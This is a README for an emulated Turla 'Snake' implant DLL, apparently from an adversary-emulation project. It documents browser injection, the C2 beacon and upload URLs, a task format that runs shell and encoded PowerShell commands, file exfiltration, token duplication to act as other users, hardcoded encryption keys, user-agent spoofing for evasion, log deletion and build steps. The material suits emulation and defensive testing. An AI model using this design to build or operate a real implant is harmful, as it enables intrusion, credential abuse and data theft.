# Snake User Module DLL

## Overview
The Snake user module DLL is injected into various userland processes by the rookit via `LoadLibrary`. Once injected, the user module will either communicate with the C2 server or execute tasks, depending on its mode of operation. The mode of operation is determined by what process the module is injected into - if injected into a browser process, the module will run in C2 communication mode. Otherwise, it will run in task execution mode.

The DLL runs via its `DllMain` function and branches off into either C2 communication mode or task execution mode, depending on the name of the injected process. The following process names will trigger C2 communication mode:
- chrome.exe
- firefox.exe
- msedge.exe
- iexplore.exe

All other process names will trigger task execution mode.

For full functionality, the module must be injected into a browser process and non-browser process. This will allow communication with the C2 server as well as actual command execution. The two module modes communicate with each other via named pipes. Specifically, the C2 communication module listens on `\\.\pipe\commsecdev` for beacon requests and task output from the task execution module, and the task execution module listens on `\\.\pipe\commctrldev` for instructions passed on by the C2 communication module. 

The task execution module will periodically send beacon requests to the C2 communications module, which will forward the requests to the C2 server and send back the instruction response. If the instruction is to download or upload files, the C2 communications module will handle that directly without intervention from the task execution module. If the instruction is to execute a process or command, the execution module will run the task and send the output to the C2 communications module to forward to the C2 server.

Turla has used a similar user module DLL architecture in the past where they broke functionality apart into a pipe server and pipe client module, where the pipe server would handle communications with the C2 server and the pipe client would handle other tasks like command execution<sup>[1](https://artemonsecurity.com/snake_whitepaper.pdf)</sup>.

## C2 Communications
The user module communicates with a hardcoded C2 server and port value via HTTP GET/POST requests. To determine whether or not the server is online, the module will perform a heartbeat check by requesting the `/PUB/home.html` file. The server must respond with `1` to indicate that it is online.

Turla has used heartbeat URLs like `/D/pub.txt` and `/IMAGE/pub.html`<sup>[1](https://artemonsecurity.com/snake_whitepaper.pdf)</sup>

After successful heartbeat verification, the module will perform `GET` requests on `/PUB/{implant_id}` (e.g. `GET /PUB/123456` to perform beacons and receive instructions. Some instructions may require the implant to run processes or execute shell commands, and the output will uploaded to the C2 server via `POST` requests to `/IMAGES/3/{instruction_id}` (e.g. `POST /IMAGES/3/123456789012345678` to upload the command output for instruction `123456789012345678`). 

Note that while Turla has uploaded collected log files to its C2 server by sending `POST` requests to URLs like `/IMAGE/2/{random numbers}`<sup>[1](https://artemonsecurity.com/snake_whitepaper.pdf)</sup>, we opted to have the implant automatically send the output to the server to improve operator usability (i.e. not having to manually request command output each time a command is run).

When instructed to download a payload, the module will send a `GET` request to `/IMAGES/3/{instruction ID}`, using the instruction ID for the associated instruction. If the instruction ID matches a tasked instruction on the server side, the payload will be delivered, and the module will save it on disk at the specified location.

When instructed to upload an arbitrary file, the module will send a `POST` request to `/IMAGES/3/{instruction ID}`, using the instruction ID for the associated instruction. If the instruction ID matches a tasked instruction for non-command-output file uploads on the server side, the C2 server will accept the upload and save it server-side. Note that the endpoint is the same as for command output uploads - the C2 server distinguishes upload types based on the instruction ID used in the URL.

The implant can also be instructed to upload its log files via `POST` requests<sup>[1](https://artemonsecurity.com/snake_whitepaper.pdf)</sup> to `/IMAGES/3/{log file ID}`, where the log file IDs are hardcoded ID strings for each log type:
- `62810421015953103444` for C2 logs
- `23329841273669992682` for execution logs
- `59463656487865612747` for pipe server (C2 communications module) logs
- `16488587954892310865` for pipe client (task execution module) logs

The implant will delete the log files after upload to clear them out<sup>[1](https://artemonsecurity.com/snake_whitepaper.pdf)</sup>.

### Implant ID
Prior to beginning C2 communications, the comms module mode will look up the local victim's computer name and use the first 10 characters as an XOR key against the default key value of `2157108421`. If the computer name is less than 10 characters, it is repeated as an XOR key. The XORed value is then converted to hex to represent the implant ID. If the implant fails to retrieve the computer name for whatever reason, it uses the default key value `2157108421` as the implant ID.

### User Agent
Turla has used the user agent string `Mozilla/4.0 (compatible; MSIE 6.0)` in the past for Snake<sup>[1](https://artemonsecurity.com/snake_whitepaper.pdf)</sup>. However, to improve defense evasion purposes, we opted for setting a commonly used user agent based on the browser process that the user module is injected into:
- For `chrome.exe`, the user module will use `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36`
- For `firefox.exe`, the user module will use `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0`
- For `iexplore.exe`, the user module will use `Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko`
- For `msedge.exe`, the user module will use `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/106.0.1370.52`

## Tasks
The implant receives tasking from the C2 server as part of a successful beacon response. If no task is specified, the implant receives a "blank" instruction that simply tells it to sleep for a random number of seconds, within a specified interval (currently between 10 and 20 seconds).

Each instruction, including empty instructions, is defined by an 18-digit random ID, and is categorized among various instruction types based on a 2-digit type code. The type code determines how to interpret the instruction arguments.

The following type codes are supported:
- `00` - "empty" instruction. Don't do anything other than sleep before the next beacon.
- `01` - shell command instruction to execute via `cmd.exe /c`. There will be a single instruction argument, which is a base64-encoded command that the implant will decode and execute. The command output will be sent to the C2 server afterwards.
- `02` - base64-encoded powershell instruction to execute via `powershell.exe -nol -noni -nop -enc ...`. There will be a single instruction argument, which is the base64-encoded command to run. The output will be sent to the C2 server afterwards. Note that we recommend prepending your powershell commands with `$ProgressPreference="SilentlyContinue";` to avoid the CLIXML stderr.
- `03` - instuction to spawn a process using the specified binary path and optional args. The optional args are base64-encoded, which the implant will decode and execute. The command output will be sent to the C2 server afterwards.
- `04` - instruction to download a file. There will be two arguments - the first one if the filename that is being requested from the C2 server (currently only used for logging purposes), and the second is the location to save the payload on disk. If only a filename is provided as the destination, the payload will be saved in the Snake home directory rather than the current directory (current directory is specified with an explicit `.\`).
- `05` - instruction to upload an arbitrary file. There will be one argument - the path to the file on the local system to upload to the C2 server.
- `06` - instruction to upload log files. No arguments needed, since the implant has the log file paths and IDs hardcoded.

Instructions also come with various options:
- Sleep time, or how many seconds to sleep after performing the instruction and before sending the next beacon.
- Username for a user to run a process as, if available.

The overall received instruction blob uses the following format:
```
ID[18-digit ID]#[2-digit type code] &arg1&arg2...&argN[sleep time]&[username to run command as]&&
```

Example:
```
ID402350900690432407#01 &d2hvYW1pIC9hbGw=#20&mydomain\myuser&&
```
In the above example, the ID is `402350900690432407`, the type code is `01`, the command to execute is `whoami /all` as the user `mydomain\myuser`, and the implant will sleep for 20 seconds afterwards.

An empty instruction may look like this (type code `00`, sleep for 15 seconds):
```
ID760156340487338735#00 #15&&&
```

A payload instruction may look like the following:
```
ID402350900690432407#04 &malware.exe&benign.exe#20&&&
```
In the above example, the module will request file `malware.exe` from the C2 server and save it as `benign.exe` in the Snake home directory.

Note that the available CTI does not dive into much detail in terms of the task format, especially for different instruction types. CTI shows a similar task format but for a different type of instruction (changing C2s rather than executing a shell command).<sup>[1](https://artemonsecurity.com/snake_whitepaper.pdf)</sup> 

Task output is automatically sent to the C2 server for operator ease of use.

### Running Tasks As Another User
The user module has the capability to run tasks as another user. For instance, while the execution mode typically runs in a SYSTEM process, it can be instructed to start a process as a domain user or domain admin. The module will do this if the received instruction contains a username to run the
command as, in `domainname\username` format. The module will then do the following:
- Take a snapshot of all the current processes on the local system
- Search through the processes until it finds a process belonging to the target user
    - If the process has an elevated token, the module will duplicate the process token and use it to spawn the child process
    - If the process belonging to the target user is not elevated, continue searching
- If all processes are searched and only a non-elevated process was found for the target user, the module will duplicate that token and use it to spawn the child process
- If all processes are exhausted and no processes are found belonging to the target user, the module will run the command under its current context

Some Turla samples have access token manipulation capabilities, such as indications of the `DuplicateTokenEx` and `OpenProcessToken` functions<sup>[3](https://www.circl.lu/pub/tr-25/)</sup> .

## Encryption

### C2
Turla has used XOR-encryption for communication, such as for tasking and for log files.<sup>[1](https://artemonsecurity.com/snake_whitepaper.pdf)</sup> 

We use a different XOR key from what Turla uses:
```
1f903053jlfajsklj39019013ut098e77xhlajklqpozufoghi642098cbmdakandqiox536898jiqjpe6092smmkeut02906
```

The user module uses XOR encryption in the following cases:
- decrypting beacon responses from the C2 server
- encrypting command output when sending it to the C2 server
- encrypting log messages
- encrypting non-log file uploads to the C2 server (logs are already encrypted)
- decrypting payload downloads from the C2 server


### Named Pipes
Turla has used CAST-128 encryption for peer-to-peer named pipe communication in other implants.<sup>[2](https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/)</sup>

To keep a similar approach, the emulated implant uses CAST-128 encryption for named pipe communication between the execution and comms module modes.

The 128-bit key used is `c7daecf7df559a1a6eb1da73617d82c1`, which is derived from 5 iterations of PBKDF2-SHA1, with a passphrase of `checkmateNASA` and salt value of `saltandpepper`. The passphrase and salt value are hardcoded in the implant, and the key is derived when the implant starts.

## Logging
The user module will log various debug, info, and error messages throughout its execution. Various log files are used to split up the different logging categories:
- `svcmon32.sdb` for C2-related logging (heartbeats, beacons, payload downloads, instruction parsing, data uploads)
- `svcstat64.bin` for pipe server logging (when in pipe server mode)
- `udmon32.bin` for pipe client logging (when in pipe client / execution mode)
- `dbsvcng64.bin` for logging related to command execution (process creation, exit codes, command output)

The log files are located in the Snake home directory. Each log message is XOR-encrypted and base-64 encoded prior to being appended to the corresponding log file as a new line. The plaintext format is as follows:
```
[LOG LEVEL] [YYYY-MM-DD HH:MM:SS] message
```
Example:
```
[DEBUG] [2022-10-06 15:38:32] Received cmd output for instruction 250559001934813785: 
```
Note that timestamps are in UTC.

## File Mutexes
Since the communication and execution modes both touch the execution and pipe client log files, the Snake user module creates a global mutex for each file:
- `Global\WindowsCommCtrlDB` for the pipe client log
- `Global\WinBaseSvcDBLock` for the execution log

The different usermodule modes will use the mutexes to coordinate synchronized file access for the commonly used log files.

Turla has used mutexes in the past, for instance in their Carbon DLL implant.<sup>[2](https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/)</sup>

## Troubleshooting
If the Snake installer is successful but you don't receive a beacon, there are two main possible points of failure:
1. The driver was unable to inject successfully into `taskhostw.exe` or the injected DLL crashed
2. The driver was unable to inject successfully into `msedge.exe`, or the injected DLL crashed

You can generally tell which injected DLLs started up by looking for the log files and checking their timestamps:
- The C2-related log (`svcmon32.sdb`) is used exclusively by the browser-injected DLL process. If the file exists, then the injected DLL was at least able to get far enough to begin logging. If the file exists but is not being updated, then either the DLL crashed or is stuck waiting for the taskhostw-injected DLL to connect to it via named pipes.
- The execution log (`dbsvcng64.bin`) is used exclusively by the taskhostw-injected DLL and has at least one line written to it when the injected DLL starts up. If the file exists, then the injected DLL was at least able to get far enough to begin logging.

There are two ways to decrypt and read the log files:
- If you have successful beacons and are troubleshooting other issues, you can task the implant to upload the logs to the C2 server, which will automatically decrypt them and write them to the `control_server/files` directory:
    - `./evalsC2client.py --set-task <guid> '{"type": 6}'`
- If you do not have a beacon, you will have to manually copy the files from the Windows target host to your linux C2 server, where you can call the 
`control_server/handlers/snake/decrypt_logs.py` utility like so:
    - `python3 decrypt_logs.py -p /path/to/log -o /path/to/output/file`

Each log file covers different aspects of the implant:
- `svcmon32.sdb` for C2-related logging (heartbeats, beacons, payload downloads, instruction parsing, data uploads)
- `svcstat64.bin` for pipe server logging (when in pipe server mode)
- `udmon32.bin` for pipe client logging (when in pipe client / execution mode)
- `dbsvcng64.bin` for logging related to command execution (process creation, exit codes, command output)

To investigate general C2 communication issues, look at the C2 logs and pipe-related logging.

To investigate execution-related issues (e.g. failed token impersonation), look at the execution log.

Note that error codes in the logs will either be a [Windows system error code](https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-) or a custom error code defined in `include/usermodule_errors.h`

## Build Instructions
The module requires the [Crypto++ library](https://github.com/weidai11/cryptopp) to be built and linked at compile-time.
The library was installed on 64-bit Windows using `msys2` and `mingw64` using the following steps
- `choco install msys2`
- Add `C:\tools\msys64` to your PATH enviromment variable to run `msys2`. Reopen console windows to register the new env variable.
- Run `msys2` and within the new prompt, run the following:
```
pacman -Syu
pacman -S --needed base-devel mingw-w64-x86_64-toolchain
pacman -S mingw-w64-x86_64-crypto++
```

Either through the UI or through Powershell, set the user environment variable for `MINGW64_ROOT` so that the value is the directory
where mingw64 was installed via msys2 above:
```
[System.Environment]::SetEnvironmentVariable('MINGW64_ROOT','C:\path\to\mingw64', 'User')
```

For example: `[System.Environment]::SetEnvironmentVariable('MINGW64_ROOT','C:\tools\msys64\mingw64', 'User')`

Reopen any command prompts or terminal windows.

Build the usermodule DLL using the following build command in Powershell from the `Resources\Snake\UserModule` directory.
If you want to adjust certain preprocessor directives for the C2 address, C2 port, and home directory, you can do so in the compilation command:
```
x86_64-w64-mingw32-g++ -DC2_ADDRESS="10.0.2.11" -DC2_PORT=8080 -DHOME_DIR="C:\\Users\\Public\\testing" -I include -I "$env:MINGW64_ROOT\include\cryptopp" -static -shared -std=c++20 -Wall -Wextra -Werror -o bin\usermodule.dll src\*.cpp -lWinInet -L "$env:MINGW64_ROOT\lib" -l cryptopp;
```

To remove symbols, you can use the `strip` command:
```
strip -s bin/usermodule.dll
```

To verify, you can run `strings` or `objdump --syms bin/usermodule.dll` - you should see an empty symbols table.

## Unit Tests
Unit tests were run on a Windows machine using CMake. Each component subfolder has its own unit test setup.

1. Make sure CMake is installed on your machine
    - `choco install cmake --installargs '"ADD_CMAKE_TO_PATH=System"'`
    - You will need to restart the shell to use cmake.
    - If cmake was already installed but is not in your path, add it to your path manually (e.g. `C:\Program Files\CMake\bin`)
1. Make sure mingw64 is installed on your machine. In this particular example, `msys2` was installed and used to install mingw64.
    - `choco install msys2`
    - Add `C:\tools\msys64` to your PATH enviromment variable to run `msys2`. Reopen console windows to register the new env variable.
    - Run `msys2` and within the new prompt, run the following:
        - `pacman -Syu`
        - `pacman -S --needed base-devel mingw-w64-x86_64-toolchain`
1. Ensure the following paths are set in the SYSTEM environment PATH variable (note that these may differ in your environment depending on how you installed CMake and mingw64).
    - `C:\Program Files\CMake\bin` or equivalent CMake `bin` folder
    - `C:\tools\msys64\mingw64\bin` or equivalent Mingw-w64 `bin` folder
    - Paths  to folders containing `gcc` and `g++` compilers if not already included in the above Mingw-w64 path folder.
    - Reopen console windows to register the new env variables.
1. Set up and run tests via Powershell from the `UserModule` directory:
```
cmake -DCMAKE_EXPORT_COMPILE_COMMANDS:BOOL=TRUE -DCMAKE_BUILD_TYPE:STRING=Release -DCMAKE_C_COMPILER:FILEPATH=gcc.exe -DCMAKE_CXX_COMPILER:FILEPATH=g++.exe -S . -B build -G "MinGW Makefiles"
cmake --build build --config Release --target all -j 4 --
cd build
ctest --output-on-failure
```
    
(OPTIONAL) If running CMake via Visual Studio Code:
1. Make sure you have the following VS Code extensions:
    - CMake
    - CMake Tools
    - C/C++
1. Configure CMake settings in VS Code:
    - CMake: CMake Path 
        - Set to wherever the cmake executable is located
    - CMake: Generator
        - Set to "MinGW Makefiles" (no quotes)
1. Open the `UserModule` project folder in VS Code
1. In Command Palette, run `CMake: Run Tests`

## CTI References
1. https://artemonsecurity.com/snake_whitepaper.pdf
2. https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
3. https://www.circl.lu/pub/tr-25/
